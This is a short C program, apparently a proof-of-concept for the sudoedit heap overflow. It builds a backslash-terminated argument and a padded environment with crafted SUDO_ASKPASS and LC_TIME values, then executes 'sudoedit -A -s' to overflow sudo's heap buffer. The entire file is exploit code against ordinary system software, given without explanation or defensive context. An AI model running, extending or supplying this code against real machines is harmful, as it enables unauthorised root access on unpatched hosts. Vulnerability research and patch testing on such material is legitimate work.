#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define USER_BUFF_SIZE 0x10
#define ENVP_SIZE 0x100
#define LC_SIZE 0x39
#define LC_TIME "LC_TIME=C.UTF-8@"

int main(void)
{
    char user_buff[USER_BUFF_SIZE];
    char *envp[ENVP_SIZE];
    char lc_var[LC_SIZE];

    memset(user_buff, 'A', USER_BUFF_SIZE);
    user_buff[USER_BUFF_SIZE - 2] = 0x5c;
    user_buff[USER_BUFF_SIZE - 1] = 0x00;

    strcpy(lc_var, LC_TIME);
    memset(lc_var + strlen(LC_TIME), 'B', LC_SIZE - strlen(LC_TIME));
    lc_var[LC_SIZE - 1] = 0x00;

    for (int i = 0; i < ENVP_SIZE; i++)
        envp[i] = "C";

    envp[ENVP_SIZE - 3] = "SUDO_ASKPASS=/bin/false";
    envp[ENVP_SIZE - 2] = lc_var;
    envp[ENVP_SIZE - 1] = NULL;

    char *args[] =
    {
        "/usr/bin/sudoedit",
        "-A",
        "-s",
        user_buff,
        NULL
    };

    execve(args[0], args, envp);
}
